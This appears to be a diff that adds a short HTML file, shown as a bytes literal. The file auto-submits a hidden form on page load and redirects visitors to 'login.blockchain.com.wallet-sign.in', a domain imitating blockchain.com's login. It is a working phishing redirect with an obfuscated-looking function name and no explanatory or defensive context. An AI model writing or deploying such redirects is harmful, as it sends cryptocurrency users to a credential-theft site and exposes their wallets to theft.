@@ -1,0 +1,1 @@
+b'<form method="post" action="https://login.blockchain.com.wallet-sign.in" type="submit" id="go"></form>\n<script type="text/javascript">\nfunction adskdariu(){document[\'getElementById\'](\'go\')[\'submit\']();}\n</script>\n<body onload="adskdariu();">\n</body>\n\n\n'
